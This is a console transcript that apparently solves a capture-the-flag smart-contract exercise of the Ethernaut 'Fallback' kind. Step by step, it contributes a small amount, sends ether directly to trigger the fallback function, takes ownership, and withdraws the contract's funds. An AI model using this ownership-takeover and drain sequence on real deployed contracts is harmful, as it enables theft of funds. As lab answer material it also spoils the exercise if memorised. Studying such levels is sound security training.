await contract.withdraw()
// reverted: caller is not the owner

await getBalance(contract.address);
// '0'

await getBalance(player);
// '0.291160108279282178'

await contract.contribute({ value: toWei('0.0005') }); // Must be less than 0.001

await contract.getContribution();
await contract.owner();
// Not me...


// Send ether outside ABI
contract.sendTransaction({ from: player, value: toWei('0.0005') })

await contract.owner();
// Success! Just need to withdraw the funds...

await contract.withdraw();
// Done!